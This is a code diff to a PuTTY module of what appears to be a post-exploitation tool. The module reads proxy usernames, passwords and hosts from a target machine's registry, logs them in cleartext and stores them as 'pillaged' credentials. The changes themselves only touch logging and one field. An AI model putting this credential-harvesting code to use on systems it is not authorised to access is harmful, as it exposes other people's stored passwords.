@@ -21,6 +21,7 @@ class Putty():
         self.db = db
         self.smb = smb
 
+
     def putty_from_registry(self):
         pfound = []
         puttys = (
@@ -36,8 +37,8 @@ class Putty():
                     ProxyPassword=self.myregops.get_reg_value(reg_session, 'ProxyPassword')[1]
                     HostName=self.myregops.get_reg_value(reg_session, 'HostName')[1]
                     ProxyUsername=self.myregops.get_reg_value(reg_session, 'ProxyUsername')[1]
-                    self.logging.debug(
-                    f"[{self.options.target_ip}] Found Putty Proxy : {ProxyUsername}:{ProxyPassword}@{HostName} ")
+                    self.logging.info(
+                    f"[{self.options.target_ip}] Found Putty Proxy : {bcolors.OKBLUE}{ProxyUsername}:{ProxyPassword}@{HostName}{bcolors.ENDC} ")
                     ############PROCESSING DATA
                     self.db.add_credz(credz_type='Putty',
                                       credz_username=ProxyUsername,
@@ -45,7 +46,7 @@ class Putty():
                                       credz_target=HostName,
                                       credz_path='',
                                       pillaged_from_computer_ip=self.options.target_ip,
-                                      pillaged_from_username=self.options.user)
+                                      pillaged_from_username='')
             except Exception:
                 self.logging.debug(f'Problems with putty : {putty}')
                 continue
